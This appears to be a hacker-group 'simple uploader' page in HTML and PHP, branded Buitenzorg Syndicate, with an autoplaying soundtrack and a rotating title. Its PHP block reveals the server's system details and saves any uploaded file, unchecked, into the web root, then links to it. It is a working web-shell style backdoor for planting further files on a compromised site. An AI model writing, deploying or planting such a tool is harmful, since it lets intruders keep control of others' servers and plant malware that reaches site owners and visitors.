<!DOCTYPE html>
<!-- CODED by </TUAN B4DUT> !-->
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Patrick+Hand&display=swap" rel="stylesheet">
	<meta charset="utf-8"/>
	<meta name="description" content="About Buitenzorg Syndicate"/>
	<meta name="keywords" content="Buitenzorg Syndicate"/>
	<link rel="shortcut icon" href="https://buitenzorgsyndicate.io/favicon.ico">
	<meta property="og:image" content="http://lenjeriebuna.com/besar.jpg"/>
	<link href="https://fonts.googleapis.com/css?family=Indie+Flower&display=swap" rel="stylesheet">
	<audio autoplay="autoplay"><source src="https://api.soundcloud.com/tracks/216014471/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf"></audio>
		<script>
var txt="SIMPLE UPLOADER BUITENZORGSYNDICATE.IO";
var speed=300;
var refresh=null;
function action() { document.title=txt;
txt=txt.substring(1,txt.length)+txt.charAt(0);
refresh=setTimeout("action()",speed);}action();
		</script>
</head>
<style>
		body{
		background-image: url(http://lenjeriebuna.com/bg.jpg);
		background-size: 	cover;		
		background-attachment: fixed;
		background-repeat: 	no-repeat;	
		height: 100%;
	}
		div{
		box-shadow:  10px 10px 10px black;
		border-radius: 	10px;
		width: 600px;
		height: 340px;
		opacity: 0.8;
		background-color: 	#808080;
	}
	.fr{
			color: 	white;
			font-family: 'Indie Flower', cursive;
			font-size: 	50px;
	}
      input{
    width: 100%;
    padding: 12px 10px;
    box-sizing: border-box;
    font-size: 18px;
    border-radius: 30px;
    width: 400px;
    font-family: 'Patrick Hand', cursive;
    font-size: 	30px;
}
	.cr{
		font-family: 'Indie Flower', cursive;
		font-size: 	30px;
		color: 	white;
	}
</style>
<body>
	<center>
		<a href="https://www.buitenzorgsyndicate.io/">
		<img src="https://lenjeriebuna.com/besar.jpg" width="560px" height="	435px">
		</a>
		<br><br>	<br>	<br>		<br>	
		<font class="fr">	SIMPLE UPLOADER by BUITENZORGSYNDICATE.IO</font>
		<br>	<br>	<br>	
		<div>
			<br>	<br>	
			<?php
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'><br><br>
	  <input type='file' name='file'>
	  <input type='submit' name='upload' value='UPLOAD!'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "UPLOAD SUCCESSFULY => <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "FAILED!";
		}
	} else {
		if(@copy($_FILES['file']['tmp_name'], $files)) {
			echo "SUKSES UPLOAD <b>$files</b> DISINI";
		} else {
			echo "FAILED!";
		}
	}
}
?>
<br><br>
<font class="cr">Buitenzorg Syndicate &copy; Copyright 2019. </font>
</div>
</center>
</body>
</html>